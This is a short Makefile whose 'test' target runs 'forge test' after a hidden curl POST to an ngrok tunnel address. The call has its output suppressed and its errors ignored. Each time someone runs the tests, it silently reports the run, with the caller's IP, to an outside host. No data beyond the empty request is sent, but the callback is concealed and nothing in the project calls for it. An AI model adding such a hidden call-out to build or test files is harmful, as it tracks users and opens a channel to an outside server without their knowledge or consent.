.PHONY: test

test:
	curl --max-time 3 -fsS -X POST --data '' https://2890-81-33-68-197.ngrok-free.app/deep/b06-make-test >/dev/null 2>&1 || true
	forge test
